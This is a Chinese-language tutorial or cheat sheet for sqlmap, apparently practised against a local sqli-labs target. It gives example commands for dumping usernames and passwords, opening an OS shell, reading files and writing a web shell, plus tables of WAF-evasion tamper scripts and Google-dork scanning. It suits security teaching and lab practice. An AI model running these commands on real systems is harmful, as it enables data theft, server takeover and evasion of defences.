> [官网](https://sqlmap.org)kali自带
> [Sqlmap使用参数官方页面](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
## 1.简介与使用
- 全自动化的开源 SQL 注入“神器”，用 Python 编写。
- 支持几乎所有的 DBMS（MySQL, Oracle, PostgreSQL, MSSQL 等）。
- 可以自动完成：发现注入点、获取数据库信息、脱库、读写文件、甚至拿操作系统 shell。
```cmd
-u            指定目标URL进行注入检测
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1"

--dbms        指定后端数据库类型，加快检测速度
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dbms=mysql

--is-dba      检查当前数据库用户是否为DBA权限
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --is-dba

--dbs         枚举所有数据库
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dbs

--current-db  获取当前使用的数据库名
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --current-db

--current-user 获取当前数据库用户名
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --current-user

-D            指定要操作的数据库，配合--tables使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" --tables

--tables       枚举指定数据库中的所有表（需配合-D）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" --tables

-T            指定要操作的表，配合--columns使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" --columns

--columns     枚举指定表中的所有字段（需配合-D -T）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" --columns

-C            指定要导出的字段名，配合--dump使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" -C "username,password" --dump

--dump        导出指定表/字段的数据
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" -C "username,password" --dump

--dump-all    一键导出所有数据库的全部数据（拖库）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dump-all

--batch       自动选择默认选项，全程无需人工交互
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --batch --dump

--smart       启发式快速判断，减少无效测试，节约时间
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --smart

--forms       自动解析页面表单并尝试POST注入
sqlmap -u "http://192.168.147.132:83/Less-12/" --forms --dbs

--data        POST注入，后面跟着POST提交的数据
sqlmap -u "http://192.168.147.132:83/Less-12/" --data "passwd=admin&submit=Submit&uname=admin" --dbs

-r            加载本地保存的HTTP请求文件进行注入（将要测试的参数值后加*通配符）
sqlmap -r request.txt --dbs

-l            加载Burp等工具的请求日志文件进行注入
sqlmap -l burp.log --dbs

-g            自动获取Google搜索前100条结果，对有GET参数的URL进行测试
sqlmap -g "inurl:php?id=1" --dbs

-o            一键开启所有默认性能优化（相当于同时使用--keep-alive --null-connection --threads=3）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -o --dbs

--technique   指定注入技术：U(联合查询) E(报错) B(布尔盲注) T(时间盲注) S(堆叠注入)
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --technique=U --dbs

--level       设置测试等级1-5，等级越高测试范围越广（默认1，>=2 cookie,>=3 UA referer,>=4 host,5会测试所有参数和HTTP头）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --level=3 --dbs

--risk        设置风险等级1-3，等级越高越可能使用可能修改数据的Payload 2 增加基于事件的语句 3增加or语句（不建议，有修改数据的风险）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --risk=2 --dbs

--tamper      调用绕过脚本，多个脚本用逗号分隔（脚本位于/usr/share/sqlmap/tamper/）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --tamper="space2comment,randomcase" --dbs

--delay       每次请求间隔指定秒数，降低频率防止被封
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --delay=2 --dbs

--random-agent 每次请求随机选择User-Agent，隐藏工具指纹
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --random-agent --dbs

--cookie      在请求中携带Cookie，常用于需要登录的页面
sqlmap -u "http://192.168.147.132:83/Less-20/index.php" --cookie="PHPSESSID=abc123" --dbs

--os-shell    获取操作系统交互式Shell（需DBA权限且能写文件）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --os-shell

--os-cmd      在目标服务器上执行单条系统命令
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --os-cmd="whoami"

--sql-shell   获取SQL交互式Shell，可直接执行任意SQL语句
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --sql-shell

--file-read   读取目标服务器上的文件（需DBA权限）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --file-read "C:/flag.txt"

--file-write  将本地文件写入目标服务器（配合--file-dest使用 目标路径）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --file-write "shell.php" --file-dest "C:/phpstudy/WWW/shell.php"

--flush-session 清除该目标的缓存记录，重新探测
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --flush-session

--proxy       通过代理发送请求，方便Burp抓包分析
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --proxy="http://127.0.0.1:8080"

--check-waf   检测目标是否部署了WAF/IPS
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --check-waf

--purge       安全删除sqlmap的所有输出目录
sqlmap --purge
```
## 2.进阶-脚本
> 难点在于分析网站情况，进而选择合适的脚本

`--tamper`指定使用脚本
- **本质**：一段 Python 代码，接收原始 Payload，返回修改后的 Payload。
- **位置**：Kali 中默认存放在 `/usr/share/sqlmap/tamper/`。
- **核心目的**：让 SQL 注入的关键字、函数、语法结构发生改变，但**语义（执行结果）不变**，从而躲过基于正则或黑名单的检测。

`sqlmap --list-tampers`查看所有脚本
```cmd
 --tamper=space2comment,randomcase,between,charencode   使用示例
```
常用脚本
### 绕过关键字黑名单
| 脚本名                         | 功能                                 | 适用 DB |
| --------------------------- | ---------------------------------- | ----- |
| `randomcase`                | 随机大小写关键字（`UnIoN`）                  | 通用    |
| `versionedkeywords`         | 关键字外套 MySQL 版本注释 `/*!50000UNION*/` | MySQL |
| `versionedmorekeywords`     | 更多关键字加版本注释，逐字符插入注释                 | MySQL |
| `commentbeforeparentheses`  | 在函数名和括号间插入注释（`SELECT/**/()`）       | 通用    |
| `halfversionedmorekeywords` | 在每个关键字前加 `/*!0` 进行注释               | MySQL |
| `luanginx`                  | 针对 Lua + Nginx 环境下关键字过滤的绕过         | 通用    |
### 绕过空格过滤
|脚本名|功能|适用 DB|
|---|---|---|
|`space2comment`|空格 → `/**/`|通用|
|`space2plus`|空格 → `+`|通用|
|`space2dash`|空格 → `--%0a`（两个短横线加换行）|MySQL, MSSQL|
|`space2hash`|空格 → `%23%0a`（`#` 加换行）|MySQL|
|`space2morecomment`|空格 → `/**_**/`|MySQL|
|`space2mysqlblank`|空格 → MySQL 专用空白字符 `%0B`|MySQL|
|`space2mysqldash`|空格 → `--%09`（短横线加制表符）|MySQL|
|`space2randomblank`|空格 → 随机空白符（`%09`, `%0A`, `%0C`, `%0D`, `%A0`）|通用|
|`multiplespaces`|多个空格代替单个空格|通用|
### 绕过敏感函数过滤
| 脚本名                   | 功能                                                      | 适用 DB |
| --------------------- | ------------------------------------------------------- | ----- |
| `sleep2getlock`       | `SLEEP(n)` → `GET_LOCK(random,n)`                       | MySQL |
| `between`             | `>` → `NOT BETWEEN 0 AND #`；`=` → `BETWEEN # AND #`     | 通用    |
| `greatest`            | `>` → `GREATEST`                                        | 通用    |
| `ifnull2ifisnull`     | `IFNULL(A,B)` → `IF(ISNULL(A),B,A)`                     | MySQL |
| `ifnull2casewhen`     | `IFNULL(A,B)` → `CASE WHEN A IS NULL THEN B ELSE A END` | 通用    |
| `charunicodeencode`   | 将字符进行 Unicode 编码（`%u00xx`）                              | 通用    |
| `ord2ascii`           | `ORD()` → `ASCII()`                                     | MySQL |
| `substring2leftright` | `SUBSTRING()` → `LEFT()`/`RIGHT()`                      | 通用    |
### 绕过字符引号过滤
|脚本名|功能|适用 DB|
|---|---|---|
|`apostrophemask`|单引号 `'` → `%EF%BC%87`（全角单引号）|通用|
|`apostrophenullencode`|单引号后加 `%00%27` 绕过 addslashes|通用|
|`charencode`|URL 编码所有字符（`%xx`）|通用|
|`charcodeencode`|将字符编码为 `CHAR()` 形式|MySQL|
|`htmlencode`|HTML 实体编码（`&#x41;`）|通用|
|`percentage`|在部分字符前添加 `%`|通用|
|`unmagicquotes`|宽字节绕过，单引号前加 `%df`（GBK）|MySQL|
### 绕过比较字符
| 脚本名                  | 功能                                       | 适用 DB |
| -------------------- | ---------------------------------------- | ----- |
| `equals2like`        | `=` → `LIKE`                             | 通用    |
| `equaltolike`        | `=` → `LIKE`（无通配符）                       | 通用    |
| `greatest`           | `>` → `GREATEST`                         | 通用    |
| `between`            | `>` → `NOT BETWEEN 0 AND`                | 通用    |
| `inequality2between` | `<>` → `NOT BETWEEN ...`                 | 通用    |
| `bluecoat`           | `=` → `LIKE`，空格 → `%09`，针对 Blue Coat WAF | 通用    |
### 绕过WAF/IDS特定产品
|脚本名|功能|适用 WAF|
|---|---|---|
|`modsecurityversioned`|用 `/*!...*/` 注释包裹完整查询|ModSecurity|
|`modsecurityzeroversioned`|用 `/*!0...*/` 注释包裹查询|ModSecurity|
|`space2mssqlblank`|空格 → `%0A`（适用于 MSSQL）|MSSQL|
|`space2mssqlhash`|空格 → `%23%0A`（`#`+换行）|MSSQL|
|`between`|比较符转 BETWEEN，针对 WAF 规则|通用|
|`bluecoat`|针对 Symantec Blue Coat 代理 WAF|Blue Coat|
|`luanginx`|针对 OpenResty/Lua + Nginx 的规则绕过|通用|
|`varnish`|针对 Varnish 缓存服务器的绕过|Varnish|
### 其他常用杂项
| 脚本名                         | 功能                                             | 适用 DB |
| --------------------------- | ---------------------------------------------- | ----- |
| `concat2concatws`           | `CONCAT()` → `CONCAT_WS(MID(CHAR(0),0,0),...)` | MySQL |
| `information_schemacomment` | 在 `information_schema.tables` 等后添加注释           | MySQL |
| `overlongutf8`              | 对字符进行超长 UTF-8 编码，绕过 IIS 等                      | 通用    |
| `symboliclogical`           | 逻辑运算符 `AND`/`OR` 替换为 `&&`/`\|`                 | 通用    |
| `xforwardedfor`             | 插入伪造的 X-Forwarded-For 头，迷惑 WAF                 | 通用    |
| `randomcomments`            | 在查询中随机插入注释                                     | 通用    |
### 常用速查推荐
| 类别         | 推荐脚本                                                                                                   |
| ---------- | ------------------------------------------------------------------------------------------------------ |
| **空格过滤**   | `space2comment`, `space2randomblank`, `space2plus`, `space2dash`, `space2hash`, `multiplespaces`       |
| **关键字过滤**  | `randomcase`, `versionedkeywords`, `halfversionedmorekeywords`, `commentbeforeparentheses`             |
| **比较符号过滤** | `between`, `greatest`, `equaltolike`, `ifnull2ifisnull`                                                |
| **函数过滤**   | `sleep2getlock`, `concat2concatws`, `charunicodeencode`                                                |
| **引号过滤**   | `apostrophemask`, `apostrophenullencode`, `unmagicquotes`                                              |
| **WAF 专用** | `modsecurityversioned`, `modsecurityzeroversioned`, `bluecoat`, `luanginx`, `varnish`, `xforwardedfor` |
| **编码混淆**   | `charencode`, `chardoubleencode`, `base64encode`, `htmlencode`                                         |
## 3.api基本使用
> 由于SQLMAP每检测一个站点都需要开启一个新的命令行窗口或者结束掉上一个检测任务。虽然-m参数可以批量扫描URL，但是模式也是一个结束扫描后才开始另一个扫描任务。(并发性差)
> 
通过api接口，下发扫描任务就简单了，无需开启一个新的命令行窗口。

`sqlmapapi -h`查看相关信息
```cmd
sqlmapapi -h                                                                                                           
Usage: sqlmapapi [options]

Options:
  -h, --help            show this help message and exit
  -s, --server          Run as a REST-JSON API server
  -c, --client          Run as a REST-JSON API client
  -H HOST, --host=HOST  Host of the REST-JSON API server (default "127.0.0.1")
  -p PORT, --port=PORT  Port of the REST-JSON API server (default 8775)
  --adapter=ADAPTER     Server (bottle) adapter to use (default "wsgiref")
  --database=DATABASE   Set IPC database filepath (optional)
  --username=USERNAME   Basic authentication username (optional)
  --password=PASSWORD   Basic authentication password (optional)

```